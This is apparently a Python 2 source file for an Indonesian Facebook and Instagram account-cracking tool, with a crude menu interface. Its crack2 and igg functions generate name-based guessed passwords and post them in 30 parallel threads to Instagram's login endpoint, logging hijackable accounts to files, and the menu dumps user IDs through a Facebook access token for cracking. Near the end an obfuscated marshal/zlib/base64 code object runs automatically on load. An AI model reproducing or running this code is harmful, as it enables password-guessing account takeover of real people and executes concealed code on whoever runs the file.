                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s | %s              ' % (K,user,pw)
                cp.append("%s | %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        for ari_kontol in list('\|-/'):
        	print('\r [%s%s%s] [ %s/%s ] [OK-:%s]<>[CP-:%s]'%(K,ari_kontol,O,loop,len(self.id),len(ok),len(cp))),
        	sys.stdout.flush()
        
def crack2(user, pwx):
	global looping, loping
	c_bff_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
				print "\r "+rm+"[Crack] [ %s/%s ] [OK:%s]<>[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_bff_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
				# print ("\r",data)
				# print ("\r [CP] %s,%s,|,%s,%s            "%(P,user,H,pw))
				# print ("\r [OK] %s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					cepeh = "Checkpoint"
					ingfo(user, pw, cepeh)
					with open("cepeh.txt", "a") as simpan:
						simpan.write(" [Checkpoint] "+user+" | "+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					okeh = "Berhasil"
					if len(status_foll) != 1:
						ingfo(user, pw, okeh)
						with open("okeh.txt", "a")as simpan:
							simpan.write(" [Berhasil] "+user+" | "+pw+"\n")
						ok.append(user)
						#follow(ses,user)
					break
				elif "Please wait" in str(data):
					print ("\r%s• Hidup kan mode peswat 2 detik tod!!  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print ("\r%s• Connection Time Out "%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None

# GANTI USER AGENT
def useragent():
	print ("\n%s %s1%s • Ganti user agent "%(O,M,O))
	print (" %s2%s • Lihat user agent "%(K,U))
	print (" %s0%s • Kembali "%(M,O))
	uas()
def uas():
    u = raw_input('\n%s • pilih? :%s '%(U,O))
    if u == '':
        print("%s • Isi yang benar kentod!! "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s•%s] ketik %sMy user agent%s di browser google atau chrome\n [%s*%s] untuk gunakan user agent lu sendiri tod"%(M,U,M,O,U,M,O))
    	print (" [%s•%s] ketik %sbawaan%s untuk menggunakan UA bawaan tools ini tod"%(M,U,O,M))
    	try:
    	    ua = raw_input("%s • masukin user agent lu? : %s"%(U,O))
            if ua in(""):
            	print("%s • Isi yang benar kentod!! "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s •  Anda akan di arahkan ke browser!! "%(M));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("bawaan","Bawaan","BAWAAN"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua);jeda(2)
                print ("\n%s [√] berhasil menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] berhasil mengganti user agent %s"%(H,U));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(U,M,U,O,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(O,M,O));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s • Isi yang benar kentod!! "%(M));jeda(2);uas()
        
# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s • Token invalid ngab "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s • Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s • Kesalahan koneksi!! "%(M))
    banner()
    
    print (' [%s•%s] %sCreated By : %sARI ARIANDI XD.'%(O,M,O,M))
    print (' [%s•%s] %sGithub Gua : %sgithub.com/ariandixd'%(M,M,U,H))
    print( "\n %s[%s*%s] -------------------------------------"%(O,M,O))
    print ('  • Nama Lu : %s'%(nama))
    print ('  • IP   Lu : %s'%(IP))
    print( " %s[%s*%s] -------------------------------------"%(O,M,O))
    print('\n [%s•%s] %sSCRIPT INI FREE, TIDAK DI PUNGGUT BIYAYA!!'%(U,U,M))
    print ('\n %s[ selamat datang %s%s%s ngentod ] \n'%(U,M,nama,U))
    print (' %s1%s • Dump id dari publick/teman'%(O,U)) 
    print (' %s2%s • Dump id dari followers'%(O,U)) 
    print (' %s3%s • Dump id dari reaction post'%(O,U))
    print (' %s4%s • Dump id cari nama %s(instagram)'%(O,U,O))
    print (' %s5%s • %sMulai crack %s(Dump id dulu kontol) '%(O,U,U,M,)) 
    print (' %s6%s • Ubah user agent'%(O,U)) 
    print (' %s7%s • Cek hasil crack'%(O,U)) 
    #print (' [%s8%s]
    #print (' [%s9%s]
    print (' %s0%s • Delet token '%(M,U))
    unik = raw_input('\n%s [•] Menu : %s'%(O,M))
    if unik == '':
        print("%s • Isi yang benar kentod!! "%(M));jeda(3);menu()
    elif unik in['1','01']:
        publik(romz)
    elif unik in['2','02']:
        followers(romz)
    elif unik in['3','03']:
        postingan(romz)
    elif unik in['4','04']:
    	igg()
    elif unik in['5','05']:
        ngentod().romiy()
    elif unik in['6','06']:
    	useragent()
    elif unik in['7','07']:
    	print "\n%s 1 • Hasil crack akun facebook "%(O)
        print "%s 2 • Hasil crack akun instagram "%(U)
        c = raw_input('\n%s • Menu : %s'%(U,K))
    	hasill(c)
    elif unik in['8','08']:
        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
    elif unik in['9','09']:
        print(ingfo)
    elif unik in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s [√] berhasil di hapus '%(H));exit()
    else:
        print("%s • Isi yang benar kentod "%(M));jeda(2);menu()
        
def hasill(c):
	if c in[""]:
		print ("%s[%s!%s] isi yang benar kentod"%(P,M,P));exit()
	elif c in["1","01"]:
		try:
			dirs = os.listdir("hasil")
			print ("")
			for file in dirs:
				print("%s -> %s%s"%(K,P,file));jeda(0.2)
			print("\n %s[%s!%s] contoh : OK-%s-%s-%s%s"%(U,M,O,ha,op,ta,".txt"))
			file = raw_input("%s • masukin file? : "%(M));jeda(0.2)
			if file == "":
				print("%s • file nggak ada tod!! "%(M))
			total = open("hasil/%s"%(file)).read().splitlines()
			print(" %s[%s•%s] --------------------------------------"%(O,U,O));jeda(2)
			nm_file = ("%s"%(file)).replace("-", " ")
			jalan(" [%s•%s] total akun : %s"%(O,U,len(total)))
			print(" %s[%s•%s] --------------------------------------"%(O,U,O));jeda(2)
			for akun in total:
				fb = akun.replace("\n","")
				tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
				print(tling);jeda(0.03)
			print(" %s[%s•%s] --------------------------------------"%(O,U,O));jeda(2)
			raw_input('\n%s [ %skembali %s] '%(P,K,P));menu()
		except (IOError):
			print("\n%s • nggak ada hasil!! "%(M))
			raw_input('\n%s [ %skembali %s] '%(U,O,U));menu()
	elif c in["2","02"]:
		print "\n%s • 1 Hasil crack akun %sOK "%(O,H)
        print "%s • 2 Hasil crack akun %sCP "%(U,K)
        while True:
        	rom = raw_input('\n%s [?] Menu : %s'%(O,M))
		if rom in['1','01']:
			try:
				oke = open("okeh.txt", "r").readlines()
				print(" %s[%s•%s] --------------------------------------"%(O,U,O));jeda(2)
				jalan(" [%s•%s] total akun : %s%s"%(U,O,H,str(len(oke))))
				print(" %s[%s•%s] --------------------------------------%s"%(O,U,O,H));jeda(2)
				okek = open("okeh.txt", "r").read()
				print (okek)
				exit(" %s[%s•%s] --------------------------------------"%(O,U,O));jeda(2)
			except IOError,KeyError:
				exit (M+"\n • nggak ada hasil awokawokawok")
		elif rom in['2','02']:
			try:
				cepe = open("cepeh.txt", "r").readlines()
				print(" %s[%s•%s] --------------------------------------"%(U,O,U));jeda(2)
				jalan(" [%s•%s] total akun : %s%s"%(K,P,K,str(len(cepe))))
				print(" %s[%s•%s] --------------------------------------%s"%(U,O,U,K));jeda(2)
				cepek = open("cepeh.txt", "r").read()
				print (cepek)
				exit(" %s[%s•%s] --------------------------------------"%(U,O,U));jeda(2)
			except IOError,KeyError:
				exit (M+"\n • nggak ada hasil awokawokawok")
		else:
			exit()
			
def igg():
	print ("\n%s %s•%s Contohh nama %s: %sAri "%(P,M,P,M,H))
	usr_ = raw_input('%s • Input nama? > %s'%(M,U))
	jumlah = input('%s • Limit user > %s'%(M,U))
	bff_2 = usr_.replace(" ", "")
	cr.append("romi_afrizal")
	mi.append(bff_2+"|"+bff_2)
	mi.append(bff_2+"_"+"|"+bff_2)
	for _i_ in range(1, jumlah+1):
		mi.append(bff_2+str(_i_)+"|"+bff_2)
		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
	print '\n%s [%s•%s] akun %sOK%s di simpan ke >%s OK.txt'%(M,K,U,H,U,H);jeda(0.2)
	print '%s [%s•%s] akun %sCP %sdi simpan ke > %sCP.txt\n'%(M,K,U,K,U,K);jeda(0.2)
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_bff_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							_bff_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
					else:
						_bff_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							_bff_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_bff_.append(_m_)
				else:
					_bff_.append(_i_[0]+"123")
					_bff_.append(_i_[0]+"12345")
					_bff_.append(_o_)
				log.submit(crack2, _o_, _bff_)
			except: pass
	exit("%s• Done Ajg"%(H))
	
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
      
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()    
